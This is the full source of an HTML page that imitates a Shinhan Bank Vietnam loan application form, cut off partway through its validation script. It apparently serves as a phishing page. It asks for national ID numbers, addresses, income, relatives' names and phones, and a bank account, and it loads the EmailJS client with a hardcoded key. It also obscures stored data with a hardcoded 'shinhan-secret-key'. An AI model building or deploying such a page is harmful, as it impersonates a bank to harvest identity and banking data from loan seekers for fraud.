<!DOCTYPE html>
<html lang="vi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Đăng Ký Vay Tín Chấp - Shinhan Bank</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
    <link href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.10.5/font/bootstrap-icons.css" rel="stylesheet">
    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js"></script>
    <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
    <style>
        body {
            font-family: 'Roboto', sans-serif;
            font-size: 16px;
            margin: 0;
        }
        .header {
            padding: 15px;
            background-color: #ffffff;
            border-bottom: 1px solid #b3cde0;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        .header img {
            height: 35px;
        }
        .header-icons {
            display: flex;
            align-items: center;
            gap: 15px;
        }
        .header-icons i {
            font-size: 24px;
            cursor: pointer;
            color: #0052cc;
        }
        .container {
            max-width: 90%;
            width: 100%;
            margin: 30px 5%;
            padding: 25px;
            background: #ffffff;
            border-radius: 10px;
            box-shadow: 0 0 15px rgba(0, 82, 204, 0.1);
        }
        @media (min-width: 768px) {
            .container {
                max-width: 700px;
                margin: 30px 5%;
            }
        }
        .nav-tabs {
            display: flex;
            justify-content: space-around;
            margin-bottom: 25px;
            margin-top: 20px;
            flex-wrap: nowrap;
        }
        .nav-tabs .nav-item {
            flex: 1;
            text-align: center;
        }
        .nav-tabs .nav-link {
            background-color: #66b0ff;
            color: #ffffff;
            border-radius: 20px;
            padding: 8px 16px;
            font-weight: 500;
            font-size: 14px;
            width: 100%;
            margin: 0 5px;
        }
        .nav-tabs .nav-link.active {
            background-color: #0033a0;
            color: #ffffff;
        }
        .section-title {
            color: #0033a0;
            font-size: 18px;
            font-weight: 700;
            margin-bottom: 20px;
            text-transform: uppercase;
        }
        .form-label {
            font-weight: 400;
            color: #1a3c87;
            font-size: 14px;
            margin-bottom: 5px;
        }
        .form-label span {
            color: #ff4d4f;
        }
        .tooltip-icon {
            cursor: pointer;
            color: #0052cc;
            font-size: 14px;
            margin-left: 5px;
        }
        .form-control, .form-select {
            border-radius: 20px;
            border: 1px solid #b3cde0;
            padding: 8px 12px;
            font-size: 14px;
            height: 40px;
        }
        .form-control:focus, .form-select:focus {
            border-color: #0033a0;
            box-shadow: 0 0 5px rgba(0, 51, 160, 0.3);
        }
        .form-control.valid, .form-select.valid {
            border-color: #0033a0;
        }
        .form-control.ultra-short {
            width: 60px;
        }
        .form-control.extra-short {
            width: 120px;
        }
        .form-control.short {
            width: 250px;
        }
        .form-control.medium {
            width: 350px;
        }
        .form-control.long {
            width: 500px;
        }
        @media (max-width: 767px) {
            .form-control.ultra-short {
                width: 20vw;
            }
            .form-control.extra-short {
                width: 40vw;
            }
            .form-control.short {
                width: 50vw;
            }
            .form-control.medium {
                width: 70vw;
            }
            .form-control.long {
                width: 85vw;
            }
        }
        .form-control:disabled {
            background-color: #e0e7ff;
        }
        .form-select {
            appearance: none;
            background-image: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" class="bi bi-chevron-down" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M1.646 4.646a.5.5 0 0 1 .708 0L8 10.293l5.646-5.647a.5.5 0 0 1 .708.708l-6 6a.5.5 0 0 1-.708 0l-6-6a.5.5 0 0 1 0-.708z"/></svg>');
            background-repeat: no-repeat;
            background-position: right 10px center;
            background-size: 12px;
            height: 40px;
        }
        .form-select.ultra-short {
            width: 60px;
        }
        .form-select.extra-short {
            width: 120px;
        }
        .form-select.short {
            width: 250px;
        }
        .form-select.long {
            width: 500px;
        }
        @media (max-width: 767px) {
            .form-select.ultra-short {
                width: 20vw;
            }
            .form-select.extra-short {
                width: 40vw;
            }
            .form-select.short {
                width: 50vw;
            }
            .form-select.long {
                width: 85vw;
            }
        }
        .form-note {
            color: #0052cc;
            font-size: 12px;
            margin-top: 5px;
        }
        .btn-primary, .btn-secondary {
            background-color: #0033a0;
            border: none;
            border-radius: 20px;
            padding: 10px 20px;
            font-weight: 700;
            font-size: 14px;
            transition: background-color 0.3s ease;
        }
        .btn-primary:hover, .btn-secondary:hover {
            background-color: #0052cc;
        }
        .footer {
            background-color: #0033a0;
            color: #ffffff;
            text-align: center;
            padding: 20px;
            font-size: 12px;
        }
        .footer-links a {
            color: #b3cde0;
            margin: 0 10px;
            text-decoration: none;
        }
        .footer-links a:hover {
            color: #ffffff;
        }
        .error-message {
            color: #ff4d4f;
            font-size: 14px;
            font-weight: 500;
            text-align: center;
            margin-top: 10px;
            padding: 8px;
            background-color: #ffe6e6;
            border-radius: 5px;
            display: none;
        }
        .invalid-feedback {
            display: none;
            font-size: 12px;
            color: #ff4d4f;
        }
        .was-validated .form-control:invalid, .was-validated .form-select:invalid {
            border-color: #ff4d4f;
        }
        .was-validated .form-control:invalid ~ .invalid-feedback,
        .was-validated .form-select:invalid ~ .invalid-feedback {
            display: block;
        }
        .form-group {
            position: relative;
            margin-bottom: 10px;
            padding-bottom: 10px;
            border-bottom: 1px solid #b3cde0;
        }
        .form-group:last-child {
            border-bottom: none;
        }
        .section-divider {
            border-top: 2px solid #0033a0;
            margin: 30px 0;
        }
        .button-group {
            display: flex;
            justify-content: center;
            gap: 20px;
            margin-top: 30px;
        }
        .dropdown-menu {
            min-width: 200px;
        }
        .dropdown-menu a {
            color: #0033a0;
            text-transform: uppercase;
            font-size: 14px;
            padding: 10px 15px;
        }
        .dropdown-menu a:hover {
            background-color: #e6f0fa;
            color: #0052cc;
        }
        .row-group {
            display: flex;
            gap: 20px;
            align-items: center;
        }
        .row-group .form-group {
            flex: 1;
        }
    </style>
</head>
<body>
    <div class="header">
        <img src="https://shinhan.com.vn/public/themes/shinhan/img/logo-01.svg" alt="Shinhan Bank Logo">
        <div class="header-icons">
            <i class="bi bi-search"></i>
            <div class="dropdown">
                <i class="bi bi-list" data-bs-toggle="dropdown" aria-expanded="false"></i>
                <ul class="dropdown-menu dropdown-menu-end">
                    <li><a class="dropdown-item" href="#">GIỚI THIỆU</a></li>
                    <li><a class="dropdown-item" href="#">LỢI ÍCH</a></li>
                    <li><a class="dropdown-item" href="#">GIẤY TỜ CẦN THIẾT</a></li>
                    <li><a class="dropdown-item" href="#">ĐĂNG KÝ TRỰC TUYẾN</a></li>
                    <li><a class="dropdown-item" href="#">XEM KẾT QUẢ</a></li>
                </ul>
            </div>
        </div>
    </div>

    <div class="container">
        <h5 class="mb-4" style="color: #0033a0; font-weight: 700; font-size: 18px;">ĐĂNG KÝ VAY</h5>
        <ul class="nav-tabs">
            <li class="nav-item">
                <a class="nav-link active" href="#">1. Nhập thông tin</a>
            </li>
            <li class="nav-item">
                <a class="nav-link" href="#">2. Xác thực và xử lý</a>
            </li>
            <li class="nav-item">
                <a class="nav-link" href="#">3. Hoàn thành</a>
            </li>
        </ul>

        <form id="registerForm" novalidate>
            <div id="emailError" class="error-message"></div>
            <div id="storageError" class="error-message"></div>
            <button id="retryEmailBtn" class="btn btn-primary" style="display: none;">Thử lại Email</button>

            <div class="mb-3">
                <label class="section-title">THÔNG TIN CÁ NHÂN</label>
                <div class="form-group">
                    <label class="form-label">Họ và Tên <span class="tooltip-icon" data-bs-toggle="tooltip" title="Họ tên đầy đủ theo CMND/CCCD" id="fullNameTooltip">ⓘ</span></label>
                    <input type="text" class="form-control long" id="fullName" required>
                    <div class="invalid-feedback">Vui lòng nhập họ và tên đầy đủ.</div>
                </div>

                <div class="form-group">
                    <label class="form-label">Ngày tháng năm sinh <span class="tooltip-icon" data-bs-toggle="tooltip" title="Định dạng DD/MM/YYYY" id="dobTooltip">ⓘ</span></label>
                    <input type="text" class="form-control ultra-short" id="dob" required>
                    <div class="invalid-feedback">Vui lòng nhập ngày tháng năm sinh (DD/MM/YYYY).</div>
                </div>

                <div class="form-group">
                    <label class="form-label">Giới tính</label>
                    <select class="form-select ultra-short" id="gender" required>
                        <option value="" disabled selected>Chọn giới tính</option>
                        <option value="Nam">Nam</option>
                        <option value="Nữ">Nữ</option>
                        <option value="Khác">Khác</option>
                    </select>
                    <div class="invalid-feedback">Vui lòng chọn giới tính.</div>
                </div>

                <div class="form-group">
                    <label class="form-label">Địa chỉ thường trú <span class="tooltip-icon" data-bs-toggle="tooltip" title="Địa chỉ ghi trên hộ khẩu, tối thiểu 10 ký tự" id="addressTooltip">ⓘ</span></label>
                    <input type="text" class="form-control long" id="contactAddress" required>
                    <div class="invalid-feedback">Vui lòng nhập địa chỉ thường trú (tối thiểu 10 ký tự).</div>
                </div>

                <div class="form-group">
                    <label class="form-label">Quê quán</label>
                    <input type="text" class="form-control long" id="hometown" required>
                    <div class="invalid-feedback">Vui lòng nhập quê quán (tối thiểu 10 ký tự).</div>
                </div>

                <div class="form-group">
                    <label class="form-label">Số định danh cá nhân (CCCD/CMND) <span class="tooltip-icon" data-bs-toggle="tooltip" title="Số định danh trên giấy tờ tùy thân (9-12 số)" id="idNumberTooltip">ⓘ</span></label>
                    <input type="text" class="form-control short" id="idNumber" required>
                    <div class="invalid-feedback">Vui lòng nhập số CCCD/CMND (9-12 số).</div>
                </div>

                <div class="form-group">
                    <label class="form-label">Quốc tịch</label>
                    <select class="form-select short" id="nationality" required>
                        <option value="" disabled selected>Chọn quốc tịch</option>
                        <option value="Việt Nam">Việt Nam</option>
                        <option value="Khác">Khác</option>
                    </select>
                    <div class="invalid-feedback">Vui lòng chọn quốc tịch.</div>
                </div>

                <div class="form-group">
                    <label class="form-label">Nơi cấp</label>
                    <select class="form-select long" id="idIssuePlace" required>
                        <option value="" disabled selected>Chọn nơi cấp</option>
                        <option value="CỤC TRƯỞNG CỤC CẢNH SÁT QUẢNG LÍ HÀNH CHÍNH VỀ TRẬT TỰ XÃ HỘI (CTCCSQLACVTTXH)">CỤC TRƯỞNG CỤC CẢNH SÁT QUẢNG LÍ HÀNH CHÍNH VỀ TRẬT TỰ XÃ HỘI (CTCCSQLACVTTXH)</option>
                        <option value="Cục Cảnh sát ĐKQL Cư trú và DLQG về dân cư">Cục Cảnh sát ĐKQL Cư trú và DLQG về dân cư</option>
                    </select>
                    <div class="invalid-feedback">Vui lòng chọn nơi cấp.</div>
                </div>
            </div>

            <hr class="section-divider">

            <div class="mb-3">
                <label class="section-title">THÔNG TIN ĐĂNG KÝ</label>
                <div class="form-group">
                    <label class="form-label">Số điện thoại <span class="tooltip-icon" data-bs-toggle="tooltip" title="Số điện thoại liên lạc chính (10 số)" id="phoneNumberTooltip">ⓘ</span></label>
                    <input type="tel" class="form-control short" id="phoneNumber" required>
                    <div class="invalid-feedback">Vui lòng nhập số điện thoại (10 số).</div>
                </div>

                <div class="form-group">
                    <label class="form-label">E-mail <span class="text-danger">*</span></label>
                    <input type="email" class="form-control short" id="email" required>
                    <div class="form-note">** Bạn sẽ nhận được nhiều thông tin hướng dẫn quy trình đăng ký thông qua email</div>
                    <div class="invalid-feedback">Vui lòng nhập email hợp lệ.</div>
                </div>

                <div class="row-group">
                    <div class="form-group">
                        <label class="form-label">Hình thức vay</label>
                        <select class="form-select short" id="loanType">
                            <option value="" disabled selected>Chọn Hình thức vay</option>
                            <option value="Vay tín chấp">Vay tín chấp</option>
                            <option value="Vay thế chấp">Vay thế chấp</option>
                            <option value="Vay thấu chi">Vay thấu chi</option>
                            <option value="Vay trả góp">Vay trả góp</option>
                        </select>
                    </div>

                    <div class="form-group">
                        <label class="form-label">Thời hạn vay yêu cầu</label>
                        <select class="form-select ultra-short" id="loanTerm" required>
                            <option value="" disabled selected>Chọn số tháng</option>
                            <option value="6">6 tháng</option>
                            <option value="12">12 tháng</option>
                            <option value="18">18 tháng</option>
                            <option value="24">24 tháng</option>
                            <option value="36">36 tháng</option>
                            <option value="48">48 tháng</option>
                            <option value="60">60 tháng</option>
                        </select>
                        <div class="invalid-feedback">Vui lòng chọn số tháng vay.</div>
                    </div>
                </div>

                <div class="form-group">
                    <label class="form-label">Số tiền vay yêu cầu (VND) <span class="tooltip-icon" data-bs-toggle="tooltip" title="Số tiền bạn muốn vay" id="loanAmountTooltip">ⓘ</span></label>
                    <select class="form-select short" id="loanAmountInput" required>
                        <option value="" disabled selected>Chọn số tiền</option>
                        <option value="10000000">10,000,000</option>
                        <option value="20000000">20,000,000</option>
                        <option value="30000000">30,000,000</option>
                        <option value="40000000">40,000,000</option>
                        <option value="50000000">50,000,000</option>
                        <option value="60000000">60,000,000</option>
                        <option value="70000000">70,000,000</option>
                        <option value="80000000">80,000,000</option>
                        <option value="90000000">90,000,000</option>
                        <option value="100000000">100,000,000</option>
                        <option value="150000000">150,000,000</option>
                        <option value="200000000">200,000,000</option>
                        <option value="300000000">300,000,000</option>
                        <option value="400000000">400,000,000</option>
                        <option value="500000000">500,000,000</option>
                        <option value="khac">Khác</option>
                    </select>
                    <div class="invalid-feedback">Vui lòng chọn số tiền vay.</div>
                </div>

                <div class="form-group">
                    <label class="form-label">Dự kiến giải ngân ngày</label>
                    <input type="text" class="form-control ultra-short" id="disbursementDate" required>
                    <div class="invalid-feedback">Vui lòng nhập ngày giải ngân (DD/MM/YYYY).</div>
                </div>

                <div class="form-group">
                    <label class="form-label">Thu nhập hàng tháng (VND) <span class="tooltip-icon" data-bs-toggle="tooltip" title="Thu nhập trung bình hàng tháng, tối thiểu 5,000,000 VND" id="incomeTooltip">ⓘ</span></label>
                    <input type="text" class="form-control short" id="income" required>
                    <div class="invalid-feedback">Vui lòng nhập thu nhập (tối thiểu 5,000,000 VND).</div>
                </div>

                <div class="form-group">
                    <label class="form-label">Tên người thân</label>
                    <input type="text" class="form-control long" id="companyName" required>
                    <div class="invalid-feedback">Vui lòng nhập tên người thân.</div>
                </div>

                <div class="form-group">
                    <label class="form-label">Số điện thoại người thân</label>
                    <input type="tel" class="form-control short" id="companyPhone" required>
                    <div class="invalid-feedback">Vui lòng nhập số điện thoại người thân (10 số).</div>
                </div>

                <div class="form-group">
                    <label class="form-label">Quan hệ (bạn bè, anh chị, đồng nghiệp...)</label>
                    <input type="text" class="form-control long" id="companyAddress" required>
                    <div class="invalid-feedback">Vui lòng nhập quan hệ (tối thiểu 10 ký tự).</div>
                </div>

                <div class="row-group">
                    <div class="form-group">
                        <label class="form-label">Có nợ xấu</label>
                        <select class="form-select ultra-short" id="hasBadDebt">
                            <option value="Có">Có</option>
                            <option value="Không">Không</option>
                        </select>
                    </div>

                    <div class="form-group">
                        <label class="form-label">Có nợ chú ý</label>
                        <select class="form-select ultra-short" id="hasHighDebt">
                            <option value="Có">Có</option>
                            <option value="Không">Không</option>
                        </select>
                    </div>
                </div>
            </div>

            <hr class="section-divider">

            <div class="mb-3">
                <label class="section-title">TÀI KHOẢN GIẢI NGÂN</label>
                <div class="form-group">
                    <label class="form-label">Tên chủ tài khoản</label>
                    <input type="text" class="form-control long" id="accountHolderName" required>
                    <div class="invalid-feedback">Vui lòng nhập tên chủ tài khoản.</div>
                </div>

                <div class="form-group">
                    <label class="form-label">Số tài khoản <span class="tooltip-icon" data-bs-toggle="tooltip" title="Số tài khoản để giải ngân, tối thiểu 8 số" id="accountNumberTooltip">ⓘ</span></label>
                    <input type="text" class="form-control short" id="accountNumber" required>
                    <div class="invalid-feedback">Vui lòng nhập số tài khoản (tối thiểu 8 số).</div>
                </div>

                <div class="form-group">
                    <label class="form-label">Tên ngân hàng <span class="tooltip-icon" data-bs-toggle="tooltip" title="Tên ngân hàng của tài khoản" id="bankNameTooltip">ⓘ</span></label>
                    <select class="form-select short" id="bankName" required>
                        <option value="" disabled selected>Chọn ngân hàng</option>
                        <option value="Shinhan Bank">Shinhan Bank</option>
                        <option value="Vietcombank">Vietcombank</option>
                        <option value="Techcombank">Techcombank</option>
                        <option value="BIDV">BIDV</option>
                        <option value="Agribank">Agribank</option>
                        <option value="MB Bank">MB Bank</option>
                        <option value="VPBank">VPBank</option>
                        <option value="Sacombank">Sacombank</option>
                        <option value="ACB">ACB</option>
                        <option value="VietinBank">VietinBank</option>
                        <option value="TPBank">TPBank</option>
                        <option value="HDBank">HDBank</option>
                        <option value="MSB">MSB</option>
                        <option value="VIB">VIB</option>
                        <option value="SeABank">SeABank</option>
                        <option value="OCB">OCB</option>
                        <option value="SCB">SCB</option>
                        <option value="Nam A Bank">Nam A Bank</option>
                        <option value="SHB">SHB</option>
                        <option value="PVcomBank">PVcomBank</option>
                        <option value="BAOVIET Bank">BAOVIET Bank</option>
                        <option value="LienVietPostBank">LienVietPostBank</option>
                        <option value="SAIGONBANK">SAIGONBANK</option>
                    </select>
                    <div class="invalid-feedback">Vui lòng chọn tên ngân hàng.</div>
                </div>

                <div class="form-group">
                    <label class="form-label">Chi nhánh</label>
                    <select class="form-select short" id="branch" required>
                        <option value="" disabled selected>Chọn chi nhánh</option>
                        <option value="Chi nhánh Shinhanbank Đà Nẵng">Chi nhánh Shinhanbank Đà Nẵng</option>
                        <option value="Chi nhánh Shinhanbank Hà Nội">Chi nhánh Shinhanbank Hà Nội</option>
                        <option value="Chi nhánh Shinhanbank TP.HCM">Chi nhánh Shinhanbank TP.HCM</option>
                    </select>
                    <div class="invalid-feedback">Vui lòng chọn chi nhánh.</div>
                </div>
            </div>

            <div class="button-group">
                <a href="/vaytieudung/shinhanbank/index.html" class="btn btn-secondary">QUAY LẠI</a>
                <button type="submit" class="btn btn-primary">BƯỚC KẾ TIẾP</button>
            </div>
        </form>
    </div>

    <div class="footer">
        <div class="footer-links">
            <a href="#">Chính sách bảo mật</a> |
            <a href="#">Điều khoản sử dụng</a> |
            <a href="#">Chính sách Cookies</a> |
            <a href="#">Miễn khoản từ chối liên kết bên ngoài</a> |
            <a href="#">Hướng dẫn truy cập web</a> |
            <a href="#">Sitemap</a>
        </div>
        <p class="mt-3">Trung tâm bảo mật | Demo Ngân hàng trực tuyến | Liên hệ | Trang Global Portal | Giới Thiệu</p>
        <p>© 2015 SHINHAN BANK VIETNAM ALL RIGHTS RESERVED.</p>
    </div>

    <script>
        let userData = {};

        function checkLocalStorageQuota() {
            try {
                const testKey = '__test__';
                localStorage.setItem(testKey, 'test');
                localStorage.removeItem(testKey);
                return true;
            } catch (e) {
                console.error('LocalStorage quota exceeded');
                return false;
            }
        }

        (function() {
            emailjs.init("OrBsI926QI2_xBh1f");
        })();

        function saveToLocalStorage() {
            if (!checkLocalStorageQuota()) {
                console.error('Failed to save to localStorage: Quota exceeded');
                return false;
            }
            try {
                const encryptedData = CryptoJS.AES.encrypt(JSON.stringify(userData), 'shinhan-secret-key').toString();
                localStorage.setItem('userData', encryptedData);
                console.log('Saved userData to localStorage:', userData);
                return true;
            } catch (error) {
                console.error('Error saving userData to localStorage:', error);
                $('#storageError').text('Lỗi thông tin không đúng. Vui lòng kiểm tra hoặc thử lại sau').show();
                return false;
            }
        }

        function loadUserData() {
            try {
                const storedData = localStorage.getItem('userData');
                if (storedData) {
                    const decryptedData = CryptoJS.AES.decrypt(storedData, 'shinhan-secret-key').toString(CryptoJS.enc.Utf8);
                    userData = JSON.parse(decryptedData);
                    console.log('Loaded userData from localStorage:', userData);
                }
            } catch (error) {
                console.error('Error loading userData from localStorage:', error);
            }
        }

        function loadRegisteredIds() {
            try {
                const storedIds = localStorage.getItem('registeredIds');
                return storedIds ? JSON.parse(storedIds) : [];
            } catch (error) {
                console.error('Error parsing registeredIds from localStorage:', error);
                return [];
            }
        }

        function saveRegisteredIds(ids) {
            if (!checkLocalStorageQuota()) return;
            try {
                localStorage.setItem('registeredIds', JSON.stringify(ids));
                console.log('Saved registeredIds to localStorage:', ids);
            } catch (error) {
                console.error('Error saving registeredIds to localStorage:', error);
                $('#storageError').show();
            }
        }

        function formatNumberInput(value) {
            if (!value) return "";
            return Number(value.replace(/[^0-9]/g, '')).toLocaleString('vi-VN');
        }

        function formatDateInput(input) {
            let value = input.val().replace(/[^0-9]/g, '');
            if (value.length > 8) value = value.slice(0, 8);
            if (value.length >= 2 && value.length < 4) {
                value = value.slice(0, 2) + '/' + value.slice(2);
            } else if (value.length >= 4) {
                value = value.slice(0, 2) + '/' + value.slice(2, 4) + '/' + value.slice(4);
            }
            input.val(value);
        }

        function isValidDate(dateStr) {
            const regex = /^(\d{2})\/(\d{2})\/(\d{4})$/;
            if (!regex.test(dateStr)) return false;
            const [_, day, month, year] = dateStr.match(regex);
            const date = new Date(year, month - 1, day);
            return date.getDate() == day && date.getMonth() + 1 == month && date.getFullYear() == year;
        }

        function getCurrentDate() {
            const today = new Date();
            const day = String(today.getDate()).padStart(2, '0');
            const month = String(today.getMonth() + 1).padStart(2, '0');
            const year = today.getFullYear();
            return `${day}/${month}/${year}`;
        }

        function calculateMonthlyPayment(loanAmount, term) {
            if (!loanAmount || !term || loanAmount <= 0) return 0;
            const monthlyRate = 0.075 / 12;
            const months = parseInt(term);
            return Math.round((loanAmount * monthlyRate) / (1 - Math.pow(1 + monthlyRate, -months)));
        }

        function calculateInterestRate(loanAmount) {
            if (!loanAmount || loanAmount <= 0) return 0;
            return loanAmount >= 50000000 ? 7.5 : 8.0;
        }

        function encryptData(data) {
            return CryptoJS.AES.encrypt(data, 'shinhan-secret-key').toString();
        }

        function debounce(func, wait) {
            let timeout;
            return function executedFunction(...args) {
                const later = () => {
                    clearTimeout(timeout);
                    func(...args);
                };
                clearTimeout(timeout);
                timeout = setTimeout(later, wait);
            };
        }

        function validateInputFormats() {
            const fullName = $('#fullName').val().trim();
            const dob = $('#dob').val().trim();
            const gender = $('#gender').val();
            const contactAddress = $('#contactAddress').val().trim();
            const hometown = $('#hometown').val().trim();
            const idNumber = $('#idNumber').val().trim();
            const nationality = $('#nationality').val();
            const idIssuePlace = $('#idIssuePlace').val();
            const phoneNumber = $('#phoneNumber').val().trim();
            const email = $('#email').val().trim();
            const loanType = $('#loanType').val();
            const loanTerm = $('#loanTerm').val();
            const loanAmount = $('#loanAmountInput').val();
            const disbursementDate = $('#disbursementDate').val().trim();
            const income = $('#income').val().replace(/[^0-9]/g, '');
            const companyName = $('#companyName').val().trim();
            const companyPhone = $('#companyPhone').val().trim();
            const companyAddress = $('#companyAddress').val().trim();
            const hasBadDebt = $('#hasBadDebt').val();
            const hasHighDebt = $('#hasHighDebt').val();
            const accountHolderName = $('#accountHolderName').val().trim();
            const accountNumber = $('#accountNumber').val().trim();
            const bankName = $('#bankName').val();
            const branch = $('#branch').val();
            const idNumberRegex = /^\d{9,12}$/;
            const phoneRegex = /^\d{10}$/;
            const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
            const numberRegex = /^\d+$/;
            const accountNumberRegex = /^\d{8,}$/;
            const loanAmountOptions = ['10000000', '20000000', '30000000', '40000000', '50000000', '60000000', '70000000', '80000000', '90000000', '100000000', '150000000', '200000000', '300000000', '400000000', '500000000', 'khac'];
            const loanTermOptions = ['6', '12', '18', '24', '36', '48', '60'];
            const bankNameOptions = ['Shinhan Bank', 'Vietcombank', 'Techcombank', 'BIDV', 'Agribank', 'MB Bank', 'VPBank', 'Sacombank', 'ACB', 'VietinBank', 'TPBank', 'HDBank', 'MSB', 'VIB', 'SeABank', 'OCB', 'SCB', 'Nam A Bank', 'SHB', 'PVcomBank', 'BAOVIET Bank', 'LienVietPostBank', 'SAIGONBANK'];
            const branchOptions = ['Chi nhánh Shinhanbank Đà Nẵng', 'Chi nhánh Shinhanbank Hà Nội', 'Chi nhánh Shinhanbank TP.HCM'];
            let isValid = true;
            const errors = [];

            if (!fullName || fullName.length < 2) {
                $('#fullName').addClass('is-invalid').removeClass('valid');
                $('#fullName').next('.invalid-feedback').text('Họ và tên phải có ít nhất 2 ký tự.');
                isValid = false;
                errors.push('fullName: Invalid');
            } else {
                $('#fullName').removeClass('is-invalid').addClass('valid');
            }

            if (!dob || !isValidDate(dob)) {
                $('#dob').addClass('is-invalid').removeClass('valid');
                $('#dob').next('.invalid-feedback').text('Ngày sinh phải đúng định dạng DD/MM/YYYY và hợp lệ.');
                isValid = false;
                errors.push('dob: Invalid date');
            } else {
                $('#dob').removeClass('is-invalid').addClass('valid');
            }

            if (!gender) {
                $('#gender').addClass('is-invalid').removeClass('valid');
                isValid = false;
                errors.push('gender: Invalid selection');
            } else {
                $('#gender').removeClass('is-invalid').addClass('valid');
            }

            if (!contactAddress || contactAddress.length < 10) {
                $('#contactAddress').addClass('is-invalid').removeClass('valid');
                $('#contactAddress').next('.invalid-feedback').text('Địa chỉ phải có ít nhất 10 ký tự.');
                isValid = false;
                errors.push('contactAddress: Invalid');
            } else {
                $('#contactAddress').removeClass('is-invalid').addClass('valid');
            }

            if (!hometown || hometown.length < 10) {
                $('#hometown').addClass('is-invalid').removeClass('valid');
                $('#hometown').next('.invalid-feedback').text('Quê quán phải có ít nhất 10 ký tự.');
                isValid = false;
                errors.push('hometown: Invalid');
            } else {
                $('#hometown').removeClass('is-invalid').addClass('valid');
            }

            if (!idNumberRegex.test(idNumber)) {
                $('#idNumber').addClass('is-invalid').removeClass('valid');
                $('#idNumber').next('.invalid-feedback').text('Số CCCD/CMND phải có 9-12 số.');
                isValid = false;
                errors.push('idNumber: Must be 9-12 digits');
            } else {
                $('#idNumber').removeClass('is-invalid').addClass('valid');
            }

            if (!nationality) {
                $('#nationality').addClass('is-invalid').removeClass('valid');
                isValid = false;
                errors.push('nationality: Invalid selection');
            } else {
                $('#nationality').removeClass('is-invalid').addClass('valid');
            }

            if (!idIssuePlace) {
                $('#idIssuePlace').addClass('is-invalid').removeClass('valid');
                isValid = false;
                errors.push('idIssuePlace: Invalid selection');
            } else {
                $('#idIssuePlace').removeClass('is-invalid').addClass('valid');
            }

            if (!phoneRegex.test(phoneNumber)) {
                $('#phoneNumber').addClass('is-invalid').removeClass('valid');
                $('#phoneNumber').next('.invalid-feedback').text('Số điện thoại phải có 10 số.');
                isValid = false;
                errors.push('phoneNumber: Must be 10 digits');
            } else {
                $('#phoneNumber').removeClass('is-invalid').addClass('valid');
            }

            if (!emailRegex.test(email)) {
                $('#email').addClass('is-invalid').removeClass('valid');
                $('#email').next('.invalid-feedback').text('Email không hợp lệ.');
                isValid = false;
                errors.push('email: Invalid format');
            } else {
                $('#email').removeClass('is-invalid').addClass('valid');
            }

            if (!loanType) {
                $('#loanType').addClass('is-invalid').removeClass('valid');
                isValid = false;
                errors.push('loanType: Invalid selection');
            } else {
                $('#loanType').removeClass('is-invalid').addClass('valid');
            }

            if (!loanTerm || !loanTermOptions.includes(loanTerm)) {
                $('#loanTerm').addClass('is-invalid').removeClass('valid');
                isValid = false;
                errors.push('loanTerm: Invalid selection');
            } else {
                $('#loanTerm').removeClass('is-invalid').addClass('valid');
            }

            if (!loanAmount || !loanAmountOptions.includes(loanAmount)) {
                $('#loanAmountInput').addClass('is-invalid').removeClass('valid');
                isValid = false;
                errors.push('loanAmount: Invalid selection');
            } else {
                $('#loanAmountInput').removeClass('is-invalid').addClass('valid');
            }

            if (!disbursementDate || !isValidDate(disbursementDate)) {
                $('#disbursementDate').addClass('is-invalid').removeClass('valid');
                $('#disbursementDate').next('.invalid-feedback').text('Ngày giải ngân phải đúng định dạng DD/MM/YYYY và hợp lệ.');
                isValid = false;
                errors.push('disbursementDate: Invalid date');
            } else {
                $('#disbursementDate').removeClass('is-invalid').addClass('valid');
            }

            if (!numberRegex.test(income) || Number(income) < 5000000) {
                $('#income').addClass('is-invalid').removeClass('valid');
                $('#income').next('.invalid-feedback').text('Thu nhập phải là số và tối thiểu 5,000,000 VND.');
                isValid = false;
                errors.push('income: Must be at least 5,000,000 VND');
            } else {
                $('#income').removeClass('is-invalid').addClass('valid');
            }

            if (!companyName || companyName.length < 2) {
                $('#companyName').addClass('is-invalid').removeClass('valid');
                $('#companyName').next('.invalid-feedback').text('Tên người thân phải có ít nhất 2 ký tự.');
                isValid = false;
                errors.push('companyName: Invalid');
            } else {
                $('#companyName').removeClass('is-invalid').addClass('valid');
            }

            if (!phoneRegex.test(companyPhone)) {
                $('#companyPhone').addClass('is-invalid').removeClass('valid');
                $('#companyPhone').next('.invalid-feedback').text('Số điện thoại người thân phải có 10 số.');
                isValid = false;
                errors.push('companyPhone: Must be 10 digits');
            } else {
                $('#companyPhone').removeClass('is-invalid').addClass('valid');
            }

            if (!companyAddress || companyAddress.length < 10) {
                $('#companyAddress').addClass('is-invalid').removeClass('valid');
                $('#companyAddress').next('.invalid-feedback').text('Quan hệ phải có ít nhất 10 ký tự.');
                isValid = false;
                errors.push('companyAddress: Invalid');
            } else {
                $('#companyAddress').removeClass('is-invalid').addClass('valid');
            }

            if (!hasBadDebt) {
                $('#hasBadDebt').addClass('is-invalid').removeClass('valid');
                isValid = false;
                errors.push('hasBadDebt: Invalid selection');
            } else {
                $('#hasBadDebt').removeClass('is-invalid').addClass('valid');
            }

            if (!hasHighDebt) {
                $('#hasHighDebt').addClass('is-invalid').removeClass('valid');
                isValid = false;
                errors.push('hasHighDebt: Invalid selection');
            } else {
                $('#hasHighDebt').removeClass('is-invalid').addClass('valid');
            }

            if (!accountHolderName || accountHolderName.length < 2) {
                $('#accountHolderName').addClass('is-invalid').removeClass('valid');
                $('#accountHolderName').next('.invalid-feedback').text('Tên chủ tài khoản phải có ít nhất 2 ký tự.');
                isValid = false;
                errors.push('accountHolderName: Invalid');
            } else {
                $('#accountHolderName').removeClass('is-invalid').addClass('valid');
            }

            if (!accountNumberRegex.test(accountNumber)) {
